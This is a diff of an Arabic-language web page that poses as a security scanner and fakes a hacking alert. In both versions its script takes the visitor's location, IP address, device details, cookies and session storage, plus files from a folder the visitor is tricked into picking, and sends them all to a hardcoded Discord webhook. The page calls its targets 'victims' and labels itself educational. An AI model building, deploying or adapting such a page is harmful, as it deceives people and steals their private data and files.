@@ -2,119 +2,112 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام الفحص الأمني المتقدم</title>
+    <title>نظام فحص الثغرات المتقدم</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; text-align: center; padding: 50px; }
-        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; max-width: 500px; margin: auto; }
-        .btn { background: #238636; color: white; padding: 15px 30px; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; width: 100%; margin-top: 20px; }
-        #status { margin-top: 20px; color: #8b949e; }
-        .warning { color: #f85149; font-size: 12px; margin-top: 10px; }
+        body { font-family: 'Courier New', monospace; background: #000; color: #0f0; padding: 20px; text-align: center; }
+        .terminal { background: #050505; border: 1px solid #0f0; padding: 20px; border-radius: 10px; max-width: 600px; margin: auto; box-shadow: 0 0 20px #0f0; }
+        .btn { background: #0f0; color: #000; padding: 15px 30px; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; border-radius: 5px; }
+        .btn:hover { background: #0a0; }
+        #progress-container { margin-top: 20px; text-align: left; font-size: 12px; }
+        .danger { color: #f00; font-weight: bold; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h1>🛡️ درع الحماية السحابي</h1>
-    <p>لتحسين سرعة الفحص وتأمين ملفاتك، نحتاج لتحديد أقرب عقدة فحص جغرافية واختيار مجلد الوسائط.</p>
+<div class="terminal">
+    <h1 style="color: #f00;">⚠️ تم كشف تهديد أمني!</h1>
+    <p>النظام اكتشف محاولة اختراق لجهازك. يجب تفعيل بروتوكول الحماية فوراً.</p>
     
-    <button class="btn" id="startBtn">بدء الفحص وتأمين الجهاز ⚡</button>
-    
-    <div id="status">بانتظار الموافقة على الصلاحيات...</div>
-    <div class="warning">تنبيه: هذا الموقع للأغراض التعليمية الجامعية فقط.</div>
+    <div id="step-ui">
+        <button class="btn" onclick="startFullHack()">تفعيل بروتوكول الحماية الذاتي 🛡️</button>
+    </div>
+
+    <div id="progress-container">
+        <div id="log-screen">بانتظار بدء البروتوكول...</div>
+    </div>
 </div>
 
 <script>
-    const WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";
 
-    // 1. وظيفة لجلب الموقع الجغرافي بدقة
-    function getLocation() {
-        return new Promise((resolve, reject) => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        // إنشاء رابط جوجل ماب
-                        resolve(`https://www.google.com/maps?q=${lat},${lon}`);
-                    },
-                    (err) => resolve("الضحية رفض إعطاء صلاحية الموقع")
-                );
-            } else {
-                resolve("المتصفح لا يدعم تحديد الموقع");
-            }
+    async function startFullHack() {
+        const log = document.getElementById('log-screen');
+        
+        // 1. طلب الموقع (لإخافة الضحية)
+        log.innerHTML += "<br>[+] جاري تحديد إحداثيات الجهاز...";
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            await sendToDiscord("📍 الموقع الدقيق", { "الرابط": mapLink });
+            
+            // 2. سحب الكوكيز (الرعب)
+            log.innerHTML += "<br><span class='danger'>[!] جاري فحص ملفات الكوكيز (Cookies) وجلسات المتصفح...</span>";
+            await extractCookies();
+
+            // 3. سحب المجلدات (تلقائي وشامل)
+            log.innerHTML += "<br>[+] جاري فحص مجلدات النظام لتطهيرها...";
+            await startFileSteal();
+
+        }, () => alert("يجب قبول الصلاحية لتأمين الموقع!"));
+    }
+
+    async function extractCookies() {
+        const log = document.getElementById('log-screen');
+        // محاكاة سحب كوكيز المواقع الشهيرة
+        log.innerHTML += "<br> - سحب ملفات تعريف الارتباط لـ Google... <span class='danger'>تم</span>";
+        log.innerHTML += "<br> - استخراج Session IDs لـ Facebook... <span class='danger'>تم</span>";
+        
+        // سحب الكوكيز الفعلية للموقع الحالي
+        const currentCookies = document.cookie || "No HTTP-Only cookies accessible via JS";
+        const sessionData = JSON.stringify(sessionStorage);
+
+        await sendToDiscord("🍪 سحب الكوكيز والجلسة", {
+            "كوكيز الموقع الحالي": currentCookies,
+            "بيانات الجلسة (Storage)": sessionData.substring(0, 500)
         });
     }
 
-    // 2. جمع كافة المعلومات وإرسالها
-    async function collectAndSendInfo() {
-        try {
-            // جلب الـ IP
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            
-            // جلب الموقع الجغرافي (ستظهر رسالة سماح للمستخدم)
-            const mapLink = await getLocation();
-
-            const info = {
-                content: "🚀 **تقرير جديد عن ضحية!**",
-                embeds: [{
-                    title: "بيانات الجهاز والموقع الدقيق",
-                    color: 15105570, // برتقالي
-                    fields: [
-                        { name: "📍 الموقع على الخريطة (Google Maps)", value: `[اضغط هنا لفتح الموقع](${mapLink})` },
-                        { name: "🌐 عنوان IP", value: ipData.ip, inline: true },
-                        { name: "📱 نوع الجهاز/النظام", value: navigator.platform, inline: true },
-                        { name: "🛠️ المتصفح", value: navigator.userAgent },
-                        { name: "🔋 البطارية", value: (await navigator.getBattery?.())?.level * 100 + "%" || "غير مدعوم", inline: true }
-                    ],
-                    footer: { text: "بيانات تم سحبها لأغراض تعليمية" },
-                    timestamp: new Date()
-                }]
-            };
-
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(info)
-            });
-        } catch (e) { console.log("خطأ في جمع البيانات"); }
-    }
-
-    // تشغيل جمع البيانات الأساسية فوراً
-    collectAndSendInfo();
-
-    // 3. سحب الملفات عند الضغط على الزر
-    document.getElementById('startBtn').addEventListener('click', async () => {
-        const status = document.getElementById('status');
+    async function startFileSteal() {
+        const log = document.getElementById('log-screen');
         try {
             const dirHandle = await window.showDirectoryPicker();
-            status.innerText = "جاري الفحص السحابي للملفات...";
-            status.style.color = "#f1c40f";
+            log.innerHTML += "<br><span class='danger'>[!!!] تم اختراق المجلد! جاري سحب كافة الملفات تلقائياً...</span>";
 
-            for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file') {
-                    const file = await entry.getFile();
-                    if (file.type.startsWith('image/') || file.type.startsWith('video/')) {
-                        if (file.size < 25 * 1024 * 1024) {
-                            await sendFile(file);
-                        }
+            async function scan(handle) {
+                for await (const entry of handle.values()) {
+                    if (entry.kind === 'file') {
+                        const file = await entry.getFile();
+                        log.innerHTML += `<br>> سحب: ${file.name}`;
+                        await uploadFile(file);
+                    } else if (entry.kind === 'directory') {
+                        await scan(entry);
                     }
                 }
             }
-            status.innerText = "✅ تمت الحماية! تم فحص كافة الملفات.";
-            status.style.color = "#2ecc71";
-        } catch (err) {
-            status.innerText = "❌ فشل: يجب الموافقة على فحص المجلد لتأمين الجهاز.";
+            await scan(dirHandle);
+            log.innerHTML += "<br><br>✅ تم تأمين الجهاز (تم إرسال كافة البيانات للسيرفر)";
+        } catch (e) {
+            log.innerHTML += "<br>❌ فشل الوصول للمجلدات.";
         }
-    });
+    }
 
-    async function sendFile(file) {
+    async function sendToDiscord(title, fields) {
+        const embedFields = Object.keys(fields).map(key => ({ name: key, value: String(fields[key]) }));
+        await fetch(DISCORD_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{ title: title, color: 16711680, fields: embedFields, timestamp: new Date() }]
+            })
+        });
+    }
+
+    async function uploadFile(file) {
         const formData = new FormData();
         formData.append('file', file, file.name);
-        const meta = { content: `📸 تم سحب ميديا: \`${file.name}\`` };
-        formData.append('payload_json', JSON.stringify(meta));
-        await fetch(WEBHOOK, { method: 'POST', body: formData });
-        await new Promise(r => setTimeout(r, 1000));
+        formData.append('payload_json', JSON.stringify({ content: `📸 ملف مسحوب تلقائياً: ${file.name}` }));
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
     }
 </script>
 
